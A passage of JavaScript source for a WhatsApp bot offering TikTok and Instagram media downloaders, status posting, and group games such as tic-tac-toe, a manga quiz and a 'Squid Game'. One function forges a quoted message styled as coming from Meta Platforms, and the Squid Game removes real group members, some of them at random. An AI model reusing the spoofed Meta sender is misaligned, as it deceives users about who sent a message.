`✨ ᴛᴛ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ
───────────────────
🎥 Recherche en cours...
📊 ❤️ - • 💬 - • 👁️ -
 
📥 ▰▰▰▱▱▱▱ 30%
───────────────────
⚡ 𝘗𝘢𝘵𝘪𝘦𝘯𝘵𝘦𝘻...`
    }, { quoted: message });

    const info = await savett(url);
    if (!info) {
      await sock.sendMessage(remoteJid, { text: '❌ Impossible de récupérer les informations.' }, { quoted: message });
      return;
    }

    // Mise à jour barre de progression
    try {
      await sock.sendMessage(remoteJid, {
        text:
`✨ ᴛᴛ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ
───────────────────
🎥 ${info.username || 'TikTok Video'}
📊 ❤️ - • 💬 - • 👁️ -
 
📥 ▰▰▰▰▰▱▱ 75%
───────────────────
⚡ 𝘗𝘢𝘵𝘪𝘦𝘯𝘵𝘦𝘻...`
      }, { quoted: message });
    } catch(e) {}

    // Envoyer vidéos sans watermark
    if (Array.isArray(info.downloads.nowm) && info.downloads.nowm.length) {
      for (const v of info.downloads.nowm.slice(0, 2)) {
        const buf = await fetchBuf(v);
        if (!buf) continue;
        await sock.sendMessage(remoteJid, {
          video: buf,
          caption:
`📥 ᴛɪᴋᴛᴏᴋ ꜱᴀᴠᴇᴅ !
───────────────────
🎬 ${info.username || 'TikTok Video'}
📝 "_Téléchargé sans watermark ✅_"
───────────────────
𝐂𝐘𝐁𝐄𝐑𝐓𝐎𝐉𝐈-𝐗𝐌𝐃

© 𝑝𝑜𝑤𝑒𝑟𝑒𝑑 𝑏𝑦 ᴅᴏsᴛᴏᴇᴠsᴋʏ ᴛᴇᴄʜX`,
          mimetype: 'video/mp4'
        }, { quoted: message });
      }
      return;
    }

    // Vidéos watermark
    if (Array.isArray(info.downloads.wm) && info.downloads.wm.length) {
      for (const v of info.downloads.wm.slice(0, 2)) {
        const buf = await fetchBuf(v);
        if (!buf) continue;
        await sock.sendMessage(remoteJid, {
          video: buf,
          caption:
`📥 ᴛɪᴋᴛᴏᴋ ꜱᴀᴠᴇᴅ !
───────────────────
🎬 ${info.username || 'TikTok Video'}
📝 "_Téléchargé avec watermark_"
───────────────────
𝐂𝐘𝐁𝐄𝐑𝐓𝐎𝐉𝐈-𝐗𝐌𝐃

© 𝑝𝑜𝑤𝑒𝑟𝑒𝑑 𝑏𝑦 ᴅᴏsᴛᴏᴇᴠsᴋʏ ᴛᴇᴄʜX`,
          mimetype: 'video/mp4'
        }, { quoted: message });
      }
      return;
    }

    // Slides photos
    if (Array.isArray(info.slides) && info.slides.length) {
      for (const s of info.slides.slice(0, 6)) {
        const buf = await fetchBuf(s.url);
        if (!buf) continue;
        await sock.sendMessage(remoteJid, {
          image: buf,
          caption:
`📥 ᴛɪᴋᴛᴏᴋ ꜱᴀᴠᴇᴅ !
───────────────────
🎬 ${info.username || 'TikTok Slide'}
📝 "_Slide ${s.index} ✅_"
───────────────────
𝐂𝐘𝐁𝐄𝐑𝐓𝐎𝐉𝐈-𝐗𝐌𝐃

© 𝑝𝑜𝑤𝑒𝑟𝑒𝑑 𝑏𝑦 ᴅᴏsᴛᴏᴇᴠsᴋʏ ᴛᴇᴄʜX`
        }, { quoted: message });
      }
      return;
    }

    await sock.sendMessage(remoteJid, { text: '❌ Aucun média trouvé.' }, { quoted: message });

  } catch (err) {
    console.error('[TIKTOK ERROR]', err);
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${err.message || err}` }, { quoted: message });
  }
}

// ─── INSTAGRAM ───────────────────────────────────────────────────────────────

// ═══ Instagram Scraper ═══════════════════════════════════════════════════════
async function reelsvideo(url) {
  try {
    const { data } = await axios.get('https://v3.saveig.app/api/ajaxSearch', {
      params: { q: url, t: 'media', lang: 'en' },
      headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json' },
      timeout: 15000
    });
    if (!data || data.status !== 'ok') return null;

    const $ = cheerio.load(data.data);
    const result = {
      username: $('.user-name a').text().trim() || null,
      thumb: $('.download-items__thumb img').attr('src') || null,
      type: null,
      videos: [],
      images: [],
      mp3: []
    };

    $('.download-items__btn a[download]').each((_, el) => {
      const href = $(el).attr('href');
      const text = $(el).text().toLowerCase();
      if (href) {
        if (text.includes('video') || href.includes('.mp4')) {
          result.videos.push(href);
          result.type = 'video';
        } else if (text.includes('photo')) {
          result.images.push(href);
          result.type = result.type || 'photo';
        }
      }
    });

    return result;
  } catch (e) {
    console.error('[reelsvideo]', e.message);
    return null;
  }
}

async function handleInstagram(sock, args, remoteJid, senderJid, message) {
  try {
    const url = (args[0] || '').trim();
    if (!url || !/^https?:\/\//i.test(url)) {
      return await sock.sendMessage(remoteJid, { 
        text: '❗ Usage: !ig <instagram_url>\nExample: !ig https://www.instagram.com/p/XXXXXXXXX/' 
      }, { quoted: message });
    }

    await sock.sendMessage(remoteJid, { text: '🔎 Recherche et téléchargement en cours...' }, { quoted: message });

    const info = await reelsvideo(url);
    if (!info) {
      return await sock.sendMessage(remoteJid, { text: '❌ Impossible de récupérer les informations.' }, { quoted: message });
    }

    // Résumé
    const summaryLines = [
      `👤 Auteur: ${info.username || 'inconnu'}`,
      `📸 Type: ${info.type || 'inconnu'}`,
      `🖼️ Images: ${info.images?.length || 0}`,
      `🎞️ Vidéos: ${info.videos?.length || 0}`
    ];
    await sock.sendMessage(remoteJid, { text: `✅ Résultat:\n${summaryLines.join('\n')}` }, { quoted: message });

    // Helper download
    async function fetchBuf(u) {
      try {
        const r = await axios.get(u, { responseType: 'arraybuffer', timeout: 30000 });
        return Buffer.from(r.data);
      } catch (e) {
        console.error('[IG] fetch error', e?.message);
        return null;
      }
    }

    // Envoyer vidéos
    if (Array.isArray(info.videos) && info.videos.length) {
      for (const v of info.videos.slice(0, 3)) {
        const buf = await fetchBuf(v);
        if (!buf) continue;
        await sock.sendMessage(remoteJid, {
          video: buf,
          caption: `🎥 Vidéo — ${info.username || 'Instagram'}`,
          mimetype: 'video/mp4'
        }, { quoted: message });
      }
      return;
    }

    // Envoyer images
    if (Array.isArray(info.images) && info.images.length) {
      for (const imgUrl of info.images.slice(0, 6)) {
        const buf = await fetchBuf(imgUrl);
        if (!buf) continue;
        await sock.sendMessage(remoteJid, {
          image: buf,
          caption: `🖼️ Image — ${info.username || 'Instagram'}`
        }, { quoted: message });
      }
      return;
    }

    await sock.sendMessage(remoteJid, { text: '❌ Aucun média trouvé.' }, { quoted: message });

  } catch (err) {
    console.error('[IG ERROR]', err);
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${err.message || err}` }, { quoted: message });
  }
}

// =============================================
// 📊 COMMANDES STATUS
// =============================================

// !tostatus — Poster texte/image/vidéo en statut WhatsApp
async function handleToStatus(sock, args, message, remoteJid, senderJid) {
  try {
    const quotedMsg = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const text = args.join(' ');

    // Statut texte
    if (!quotedMsg && text) {
      const colors = ['#FF5733','#33FF57','#3357FF','#FF33A8','#FFD700','#00CED1'];
      const bgColor = colors[Math.floor(Math.random() * colors.length)];
      await sock.sendMessage('status@broadcast', {
        text: text,
        backgroundColor: bgColor,
        font: Math.floor(Math.random() * 5),
        statusJidList: [senderJid]
      });
      await sock.sendMessage(remoteJid, {
        text: `✅ *Text status posted!*\n\n📝 "${text}"\n🎨 Couleur: ${bgColor}`
      });
      return;
    }

    // Statut image (répondre à une image)
    if (quotedMsg?.imageMessage) {
      const imgData = quotedMsg.imageMessage;
      const stream = await downloadContentFromMessage(imgData, 'image');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);
      const caption = text || imgData.caption || '';

      await sock.sendMessage('status@broadcast', {
        image: buffer,
        caption: caption,
        statusJidList: [senderJid]
      });
      await sock.sendMessage(remoteJid, {
        text: `✅ *Image status posted!*\n📝 Caption: ${caption || '(none)'}`
      });
      return;
    }

    // Statut vidéo (répondre à une vidéo)
    if (quotedMsg?.videoMessage) {
      const vidData = quotedMsg.videoMessage;
      const stream = await downloadContentFromMessage(vidData, 'video');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);

      await sock.sendMessage('status@broadcast', {
        video: buffer,
        caption: text || '',
        statusJidList: [senderJid]
      });
      await sock.sendMessage(remoteJid, {
        text: `✅ *Video status posted!*`
      });
      return;
    }

    await sock.sendMessage(remoteJid, {
      text: `📊 *ToStatus - Post a status*\n\nUsage:\n• ${config.prefix}tostatus [texte] → text status\n• Reply to an image + ${config.prefix}tostatus → image status\n• Réponds à une vidéo + ${config.prefix}tostatus → video status`
    });
  } catch(e) {
    console.error('خطأ tostatus:', e);
    await sock.sendMessage(remoteJid, { text: `❌ Error: ${e.message}` });
  }
}

// !groupstatus — Post a status dans le groupe (épingler message)
async function handleGroupStatus(sock, args, message, remoteJid, senderJid, isGroup) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ Group-only command!' });
    return;
  }
  const text = args.join(' ');
  if (!text) {
    await sock.sendMessage(remoteJid, {
      text: `📢 *GroupStatus*\n\nUsage: ${config.prefix}groupstatus [message]\n\nEnvoie un formatted pinned message in the group.`
    });
    return;
  }

  const now = new Date().toLocaleString('fr-FR', { timeZone: 'America/Port-au-Prince' });
  try {
    const statusMsg = await sock.sendMessage(remoteJid, {
      text: `📌 *GROUP STATUS*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n${text}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n🕐 ${now}\n✍️ Par: @${senderJid.split('@')[0]}`,
      mentions: [senderJid]
    });
    // Épingler le message
    try {
      await sock.sendMessage(remoteJid, {
        pin: { type: 1, time: 604800 }, // 7 jours
        key: statusMsg.key
      });
    } catch(e) { /* silencieux si pas admin */ }
  } catch(e) {
    await sock.sendMessage(remoteJid, { text: `❌ Error: ${e.message}` });
  }
}

// =============================================
// 🎮 SYSTÈME DE JEUX
// =============================================

// ─── État global des jeux ─────────────────────────────────────────────────
const gameState = new Map(); // remoteJid → { type, data }

// ─── Dispatcher réactions jeux ────────────────────────────────────────────
async function handleGameReaction(sock, message, messageText, remoteJid, senderJid) {
  const state = gameState.get(remoteJid);
  if (!state) return;

  if (state.type === 'tictactoe') {
    await processTTTMove(sock, message, messageText, remoteJid, senderJid, state);
  } else if (state.type === 'quiz') {
    await processQuizAnswer(sock, message, messageText, remoteJid, senderJid, state);
  } else if (state.type === 'squidgame') {
    await processSquidReaction(sock, message, messageText, remoteJid, senderJid, state);
  }
}

// =============================================
// ❌⭕ TIC-TAC-TOE
// =============================================
const TTT_EMPTY = '⬜';
const TTT_X     = '❌';
const TTT_O     = '⭕';

function renderTTTBoard(board) {
  return board.reduce((str, cell, i) => str + cell + (i % 3 === 2 ? '\n' : ''), '');
}

function checkTTTWin(board, mark) {
  const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
  return wins.some(([a,b,c]) => board[a]===mark && board[b]===mark && board[c]===mark);
}

async function handleTicTacToe(sock, args, message, remoteJid, senderJid, isGroup) {
  const existing = gameState.get(remoteJid);

  // Si partie en cours
  if (existing?.type === 'tictactoe') {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ A TicTacToe game is already in progress!\n\n${renderTTTBoard(existing.data.board)}\nType a number *1-9* to play.\n\n_${config.prefix}ttt stop → abandon_`
    });
    return;
  }

  // Stop la partie
  if (args[0] === 'stop') {
    gameState.delete(remoteJid);
    await sock.sendMessage(remoteJid, { text: '🛑 TicTacToe game abandoned.' });
    return;
  }

  // Démarrer
  const player1 = senderJid;
  const player2 = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];

  if (!player2) {
    await sock.sendMessage(remoteJid, {
      text: `❌⭕ *TIC-TAC-TOE*\n\nUsage: ${config.prefix}tictactoe @adversaire\n\nMention a player to start!\n\nDuring the game, type a number:\n1️⃣2️⃣3️⃣\n4️⃣5️⃣6️⃣\n7️⃣8️⃣9️⃣`,
      mentions: []
    });
    return;
  }

  const board = Array(9).fill(TTT_EMPTY);
  gameState.set(remoteJid, {
    type: 'tictactoe',
    data: {
      board,
      players: [player1, player2],
      marks:   [TTT_X, TTT_O],
      turn: 0,
      startTime: Date.now()
    }
  });

  await sock.sendMessage(remoteJid, {
    text: `❌⭕ *TIC-TAC-TOE COMMENCE!*\n\n` +
      `👤 Joueur 1: @${player1.split('@')[0]} → ❌\n` +
      `👤 Joueur 2: @${player2.split('@')[0]} → ⭕\n\n` +
      `${renderTTTBoard(board)}\n` +
      `*Position:*\n1️⃣2️⃣3️⃣\n4️⃣5️⃣6️⃣\n7️⃣8️⃣9️⃣\n\n` +
      `@${player1.split('@')[0]} → Your turn! Send a number 1-9`,
    mentions: [player1, player2]
  });
}

async function processTTTMove(sock, message, text, remoteJid, senderJid, state) {
  const { board, players, marks, turn } = state.data;
  const currentPlayer = players[turn];
  const currentMark   = marks[turn];

  if (senderJid !== currentPlayer) return; // Pas ton tour

  const pos = parseInt(text.trim()) - 1;
  if (isNaN(pos) || pos < 0 || pos > 8) return;
  if (board[pos] !== TTT_EMPTY) {
    await sock.sendMessage(remoteJid, { text: '⚠️ That cell is already taken!' });
    return;
  }

  board[pos] = currentMark;

  if (checkTTTWin(board, currentMark)) {
    gameState.delete(remoteJid);
    await sock.sendMessage(remoteJid, {
      text: `${renderTTTBoard(board)}\n\n🏆 *@${currentPlayer.split('@')[0]} GAGNE!* ${currentMark}\n\nFélicitations! 🎉`,
      mentions: [currentPlayer]
    });
    return;
  }

  if (board.every(c => c !== TTT_EMPTY)) {
    gameState.delete(remoteJid);
    await sock.sendMessage(remoteJid, {
      text: `${renderTTTBoard(board)}\n\n🤝 *DRAW!*\nGood game to both of you!`
    });
    return;
  }

  const nextTurn = turn === 0 ? 1 : 0;
  state.data.turn = nextTurn;
  const nextPlayer = players[nextTurn];

  await sock.sendMessage(remoteJid, {
    text: `${renderTTTBoard(board)}\n\n@${nextPlayer.split('@')[0]} → Your turn! Send a number 1-9`,
    mentions: [nextPlayer]
  });
}

// =============================================
// 🍥 QUIZ MANGA
// =============================================
const QUIZ_MANGA = [
  { q: '🍥 Dans quel anime le personnage Naruto Uzumaki est-il le héros principal?', a: 'naruto', hint: 'C\'est le titre de l\'anime!' },
  { q: '⚔️ Quel est le pouvoir signature de Goku dans Dragon Ball?', a: 'kamehameha', hint: 'K-A-M-E...' },
  { q: '👁️ Comment s\'appelle le pouvoir oculaire de Sasuke?', a: 'sharingan', hint: 'Commence par S' },
  { q: '💀 Dans One Piece, comment s\'appelle le chapeau de paille emblématique de Luffy?', a: 'chapeau de paille', hint: 'C\'est son surnom!' },
  { q: '🗡️ Dans Demon Slayer, quel est le style de respiration principal de Tanjiro?', a: 'eau', hint: 'Un élément liquide' },
  { q: '⚡ Dans Attack on Titan, comment s\'appelle le titan colossal de Bertholdt?', a: 'titan colossal', hint: 'Il est très grand' },
  { q: '🏴‍☠️ Quel est le vrai nom de Zoro dans One Piece?', a: 'roronoa zoro', hint: 'Son nom de famille commence par R' },
  { q: '🔮 Dans Hunter x Hunter, comment s\'appelle l\'énergie vitale que les personnages utilisent?', a: 'nen', hint: '3 lettres' },
  { q: '🌊 Dans My Hero Academia, quel est le Quirk de Midoriya?', a: 'one for all', hint: 'Héritage de All Might' },
  { q: '🌙 Dans Bleach, comment s\'appelle l\'épée spirituelle d\'Ichigo?', a: 'zangetsu', hint: 'Tranche la lune' },
  { q: '🔥 Quel anime suit Tanjiro Kamado chassant des démons pour sauver sa sœur?', a: 'demon slayer', hint: 'Kimetsu no Yaiba' },
  { q: '💥 Dans One Punch Man, pourquoi Saitama est-il devenu chauve?', a: 'entrainement', hint: 'Il a trop...' },
  { q: '🃏 Dans Death Note, quel est le nom du carnet magique?', a: 'death note', hint: 'Le titre de l\'anime!' },
  { q: '🐉 Dans Fairy Tail, quel est le pouvoir de Natsu Dragneel?', a: 'flamme', hint: 'Très chaud!' },
  { q: '⚙️ Dans Fullmetal Alchemist, quels sont les frères Elric?', a: 'edward et alphonse', hint: 'Ed et Al' },
];

async function handleQuizManga(sock, args, message, remoteJid, senderJid, isGroup) {
  const existing = gameState.get(remoteJid);

  // Stop
  if (args[0] === 'stop') {
    if (existing?.type === 'quiz') {
      gameState.delete(remoteJid);
      await sock.sendMessage(remoteJid, { text: '🛑 Quiz arrêté!\n\n📊 *Score final:*\n' + formatQuizScores(existing.data.scores) });
    } else {
      await sock.sendMessage(remoteJid, { text: '❌ No quiz in progress.' });
    }
    return;
  }

  // Partie déjà en cours
  if (existing?.type === 'quiz') {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ A quiz is already in progress!\n\n❓ ${existing.data.current.q}\n\n_${config.prefix}quiz stop → stop_`
    });
    return;
  }

  // Nombre de questions
  const total = Math.min(parseInt(args[0]) || 10, 15);
  const questions = [...QUIZ_MANGA].sort(() => Math.random() - 0.5).slice(0, total);

  gameState.set(remoteJid, {
    type: 'quiz',
    data: {
      questions,
      index: 0,
      current: questions[0],
      scores: {},
      total,
      startTime: Date.now(),
      hintUsed: false
    }
  });

  await sock.sendMessage(remoteJid, {
    text: `🍥 *QUIZ MANGA COMMENCE!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n📚 *${total} questions* sur les mangas!\nAnswer in chat — first to answer correctly wins the point!\n\n_${config.prefix}quiz stop → stop_\n\n━━━━━━━━━━━━━━━━━━━━━━━\n\n❓ *Question 1/${total}:*\n${questions[0].q}\n\n_💡 Type_ ${config.prefix}hint _for a hint (-1 pt)_`
  });

  // Timer 30s par question
  setTimeout(() => advanceQuizQuestion(sock, remoteJid, '⏰ Times up! No one found it.'), 30000);
}

function formatQuizScores(scores) {
  if (Object.keys(scores).length === 0) return '_No points scored_';
  return Object.entries(scores)
    .sort(([,a],[,b]) => b - a)
    .map(([jid, pts], i) => `${i===0?'🥇':i===1?'🥈':'🥉'} @${jid.split('@')[0]}: ${pts} pt(s)`)
    .join('\n');
}

async function advanceQuizQuestion(sock, remoteJid, prefix = '') {
  const state = gameState.get(remoteJid);
  if (!state || state.type !== 'quiz') return;

  const { questions, index, total, scores } = state.data;
  const nextIndex = index + 1;

  if (nextIndex >= total) {
    // Fin du quiz
    gameState.delete(remoteJid);
    const winner = Object.entries(scores).sort(([,a],[,b]) => b-a)[0];
    await sock.sendMessage(remoteJid, {
      text: `${prefix ? prefix + '\n\n' : ''}🏁 *FIN DU QUIZ MANGA!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n📊 *Final ranking:*\n${formatQuizScores(scores)}\n\n${winner ? `🏆 Winner: @${winner[0].split('@')[0]} with ${winner[1]} point(s)!` : 'No winner!'}`,
      mentions: winner ? [winner[0]] : []
    });
    return;
  }

  state.data.index    = nextIndex;
  state.data.current  = questions[nextIndex];
  state.data.hintUsed = false;

  await sock.sendMessage(remoteJid, {
    text: `${prefix ? prefix + '\n\n' : ''}❓ *Question ${nextIndex+1}/${total}:*\n${questions[nextIndex].q}\n\n_💡 Type_ ${config.prefix}hint _for a hint_`
  });

  setTimeout(() => advanceQuizQuestion(sock, remoteJid, '⏰ Times up!'), 30000);
}

async function processQuizAnswer(sock, message, text, remoteJid, senderJid, state) {
  const { current, hintUsed, scores } = state.data;
  const prefix = config.prefix;

  // Indice
  if (text.toLowerCase() === `${prefix}hint` || text.toLowerCase() === prefix + 'hint') {
    if (!hintUsed) {
      state.data.hintUsed = true;
      await sock.sendMessage(remoteJid, { text: `💡 *Hint:* ${current.hint}` });
    }
    return;
  }

  // Vérifier réponse
  if (text.toLowerCase().trim() === current.a.toLowerCase()) {
    scores[senderJid] = (scores[senderJid] || 0) + (hintUsed ? 0.5 : 1);
    const pts = scores[senderJid];
    await sock.sendMessage(remoteJid, {
      text: `✅ *CORRECT ANSWER!*\n🎉 @${senderJid.split('@')[0]} → +${hintUsed?'0.5':'1'} pt (Total: ${pts})\n\n📖 Answer: *${current.a}*`,
      mentions: [senderJid]
    });
    await advanceQuizQuestion(sock, remoteJid);
  }
}

// =============================================
// 🦑 SQUID GAME
// =============================================
const SQUID_ROUNDS = [
  { name: '🔴 Feu Rouge / 🟢 Feu Vert', instruction: '🟢 = *AVANCER*  |  🔴 = *RESTER IMMOBILE*\n\nRéagissez with 🟢 pour avancer et survivre!', target: '🟢', wrong: '🔴', duration: 25000 },
  { name: '🍬 Dalgona Challenge', instruction: '🟢 = *DÉCOUPER AVEC SOIN*  |  🔴 = *TROP RAPIDE (éliminé)*\n\nRéagissez with 🟢 pour réussir!', target: '🟢', wrong: '🔴', duration: 20000 },
  { name: '🪆 Marbles Game', instruction: '🟢 = *JOUER*  |  🔴 = *ABANDONNER*\n\nRéagissez with 🟢 pour continuer!', target: '🟢', wrong: '🔴', duration: 30000 },
  { name: '🌉 Glass Bridge', instruction: '🟢 = *VERRE SOLIDE*  |  🔴 = *VERRE FRAGILE (mort)*\n\nRéagissez with 🟢 pour traverser!', target: '🟢', wrong: '🔴', duration: 15000 },
  { name: '🗡️ Round Final - Squid Game', instruction: '🟢 = *ATTAQUER*  |  🔴 = *DÉFENDRE*\n\nRéagissez with 🟢 pour gagner le round final!', target: '🟢', wrong: '🔴', duration: 20000 },
];

async function handleSquidGame(sock, args, message, remoteJid, senderJid, isGroup) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ Squid Game → groups only!' });
    return;
  }

  const existing = gameState.get(remoteJid);
  if (existing?.type === 'squidgame') {
    if (args[0] === 'stop') {
      gameState.delete(remoteJid);
      await sock.sendMessage(remoteJid, { text: '🛑 Squid Game arrêté par l\'admin.' });
      return;
    }
    await sock.sendMessage(remoteJid, { text: `⚠️ A Squid Game is already in progress!\n_${config.prefix}squidgame stop → stop_` });
    return;
  }

  // Récupérer tous les participants du groupe
  let participants = [];
  try {
    const meta = await sock.groupMetadata(remoteJid);
    participants = meta.participants.map(p => p.id).filter(id => id !== sock.user?.id && id !== senderJid);
  } catch(e) {
    await sock.sendMessage(remoteJid, { text: '❌ Unable to fetch group members.' });
    return;
  }

  if (participants.length < 4) {
    await sock.sendMessage(remoteJid, { text: '❌ At least 4 members needed to play!' });
    return;
  }

  // Init état
  gameState.set(remoteJid, {
    type: 'squidgame',
    data: {
      players: new Set(participants),     // players still alive
      eliminated: new Set(),              // eliminated
      roundIndex: 0,
      reactions: new Map(),               // senderJid → emoji
      roundActive: false,
      host: senderJid,
      startTime: Date.now()
    }
  });

  const mentions = participants.slice(0, 20); // max 20 mentions
  await sock.sendMessage(remoteJid, {
    text: `🦑 *SQUID GAME COMMENCE!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `👥 *${participants.length} participant(s)* enregistrés!\n` +
      `🎯 Survive all rounds to win!\n\n` +
      `📋 *Règles:*\n` +
      `• Réagissez with le bon emoji quand demandé\n` +
      `• 🟢 = Good action | 🔴 = Wrong action\n` +
      `• Si 3 rounds without reaction → 10 players kicked\n` +
      `• 4 good reactions = round protection\n\n` +
      `⏳ *Round 1 starts in 5 seconds...*\n\n` +
      `${participants.slice(0,20).map(p => `@${p.split('@')[0]}`).join(' ')}`,
    mentions
  });

  setTimeout(() => startSquidRound(sock, remoteJid), 5000);
}

async function startSquidRound(sock, remoteJid) {
  const state = gameState.get(remoteJid);
  if (!state || state.type !== 'squidgame') return;

  const { roundIndex, players, eliminated } = state.data;

  if (roundIndex >= SQUID_ROUNDS.length || players.size === 0) {
    await endSquidGame(sock, remoteJid, state);
    return;
  }

  const round = SQUID_ROUNDS[roundIndex];
  state.data.reactions  = new Map();
  state.data.roundActive = true;

  const alive = [...players];
  const mentions = alive.slice(0, 20);

  await sock.sendMessage(remoteJid, {
    text: `🦑 *ROUND ${roundIndex + 1}: ${round.name}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `${round.instruction}\n\n` +
      `👥 Players remaining: *${players.size}*\n` +
      `⏱️ You have *${round.duration / 1000} seconds!*\n\n` +
      `${alive.slice(0,20).map(p => `@${p.split('@')[0]}`).join(' ')}`,
    mentions
  });

  // Timer de fin de round
  setTimeout(() => endSquidRound(sock, remoteJid, round), round.duration);
}

async function processSquidReaction(sock, message, text, remoteJid, senderJid, state) {
  const { roundActive, players, reactions } = state.data;
  if (!roundActive) return;
  if (!players.has(senderJid)) return; // Déjà éliminé

  const emoji = text.trim();
  if (emoji === '🟢' || emoji === '🔴') {
    reactions.set(senderJid, emoji);
  }
}

async function endSquidRound(sock, remoteJid, round) {
  const state = gameState.get(remoteJid);
  if (!state || state.type !== 'squidgame') return;

  state.data.roundActive = false;
  const { players, reactions, eliminated, roundIndex } = state.data;

  const goodReactions  = [...reactions.entries()].filter(([,e]) => e === round.target).map(([j]) => j);
  const wrongReactions = [...reactions.entries()].filter(([,e]) => e === round.wrong).map(([j]) => j);
  const noReaction     = [...players].filter(j => !reactions.has(j));

  // Éliminer ceux qui ont réagi with le mauvais emoji
  wrongReactions.forEach(j => { players.delete(j); eliminated.add(j); });

  let resultText = `📊 *RÉSULTAT ROUND ${roundIndex + 1}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  resultText += `✅ Good reactions: *${goodReactions.length}*\n`;
  resultText += `❌ Wrong reactions: *${wrongReactions.length}*\n`;
  resultText += `😶 No reaction: *${noReaction.length}*\n\n`;

  // Règle: si 0 bonne réaction sur 3 rounds consécutifs → expulser 10
  state.data.noReactionStreak = (state.data.noReactionStreak || 0);
  if (goodReactions.length === 0) {
    state.data.noReactionStreak++;
    if (state.data.noReactionStreak >= 3) {
      // Expulser 10 joueurs aléatoires
      const toKick = [...players].sort(() => Math.random() - 0.5).slice(0, Math.min(10, players.size));
      toKick.forEach(j => { players.delete(j); eliminated.add(j); });
      resultText += `☠️ *3 rounds without reaction! 10 players kicked!*\n`;
      resultText += toKick.map(j => `• @${j.split('@')[0]}`).join('\n') + '\n\n';
      state.data.noReactionStreak = 0;

      try {
        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
        if (botIsAdmin) {
          for (const jid of toKick) {
            await sock.groupParticipantsUpdate(remoteJid, [jid], 'remove').catch(() => {});
            await delay(500);
          }
        }
      } catch(e) {}
    }
  } else if (goodReactions.length >= 4) {
    // Protection: les 4+ premiers protégés ce round
    state.data.noReactionStreak = 0;
    resultText += `🛡️ *${goodReactions.length} joueurs ont réagi correctement → protégés ce round!*\n\n`;
  } else {
    state.data.noReactionStreak = 0;
  }

  // Expulser les mauvaises réactions du groupe
  if (wrongReactions.length > 0) {
    try {
      const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
      if (botIsAdmin) {
        for (const jid of wrongReactions) {
          await sock.groupParticipantsUpdate(remoteJid, [jid], 'remove').catch(() => {});
          await delay(500);
        }
      }
    } catch(e) {}
    resultText += `🚪 *Eliminated:*\n${wrongReactions.map(j => `• @${j.split('@')[0]}`).join('\n')}\n\n`;
  }

  resultText += `👥 *Survivors: ${players.size}*\n`;

  const allMentions = [...goodReactions, ...wrongReactions, ...noReaction].slice(0, 20);
  await sock.sendMessage(remoteJid, { text: resultText, mentions: allMentions });

  state.data.roundIndex++;

  if (players.size <= 1) {
    await endSquidGame(sock, remoteJid, state);
    return;
  }

  await delay(4000);
  await startSquidRound(sock, remoteJid);
}

async function endSquidGame(sock, remoteJid, state) {
  gameState.delete(remoteJid);
  const { players, eliminated } = state.data;

  const winners = [...players];
  const winMentions = winners.slice(0, 10);

  await sock.sendMessage(remoteJid, {
    text: `🦑 *SQUID GAME TERMINÉ!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `${winners.length > 0
        ? `🏆 *${winners.length} GAGNANT(S):*\n${winners.map(j => `👑 @${j.split('@')[0]}`).join('\n')}`
        : '☠️ *Tous les joueurs ont été eliminated!*'
      }\n\n` +
      `📊 Eliminated: ${eliminated.size}\n` +
      `🎮 Rounds joués: ${state.data.roundIndex}\n\n` +
      `_Thanks for playing Squid Game!_ 🦑`,
    mentions: winMentions
  });
}

// =============================================
// 🖼️ SYSTÈME D'IMAGES PAR COMMANDE
// =============================================
// Place une image dans le dossier du bot nommée:
//   ping.jpg, alive.jpg, info.jpg, sticker.jpg...
// Le bot l'enverra automatiquement en caption!
// Formats supportés: .jpg .jpeg .png .gif .webp
// =============================================

// =============================================
// 🔧 BUILD META QUOTE — Crée un message cité stylé
// =============================================
function buildMetaQuote(latencyMs = null) {
  const botName = config.botName;
  const latencyText = latencyMs !== null ? ` • 🏓 ${latencyMs}ms` : '';

  // Meta Contact Quote (style Meta AI)
  const metaQuote = {
    key: {
      remoteJid: 'status@broadcast',
      participant: '50943981073@s.whatsapp.net',
      fromMe: false,
      id: 'META_AI_PING'
    },
    message: {
      contactMessage: {
        displayName: botName,
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD`
      }
    }
  };

  return metaQuote;
}

// =============================================
// 🏅 BADGE CONTEXT — Contexte avec badge stylé
// =============================================
function buildBadgeCtx() {
  const github = 'https://github.com/lord007-maker/CYBERTOJI-XMD-.git';
  const BADGE_CTX = {
    externalAdReply: {
      title: '🏴‍☠️ 𝐂𝐘𝐁𝐄𝐑𝐓𝐎𝐉𝐈 𝐗𝐌𝐃',
      body: 'ᴅᴏsᴛᴏᴇᴠsᴋʏ ᴛᴇᴄʜX',
      mediaType: 1,
      previewType: 0,
      showAdAttribution: true,
      sourceUrl: github,
      thumbnailUrl: 'https://pin.it/2V7gTSkgI',
      renderLargerThumbnail: false
    }
  };
  return BADGE_CTX;
}

async function sendWithImage(sock, remoteJid, cmdName, text, mentions = [], latencyMs = null) {
